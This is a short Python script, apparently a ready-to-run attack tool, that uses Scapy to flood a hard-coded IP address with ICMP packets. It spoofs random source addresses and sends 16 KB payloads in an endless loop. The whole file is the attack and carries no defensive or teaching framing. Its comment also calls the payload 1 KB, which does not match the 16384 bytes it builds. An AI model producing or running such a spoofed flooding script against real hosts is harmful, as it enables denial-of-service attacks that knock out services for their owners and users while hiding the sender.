from scapy.all import *

target_ip="117.247.209.236"
target_port=80

ip=IP(src=RandIP(), dst=target_ip) #for spoofing sender's IP
icmp=ICMP()

raw=str("A"*16384) #raw file of size 1KB to be flooded

p=ip/icmp/raw #creating packet p

send(p, loop=1, verbose=0)
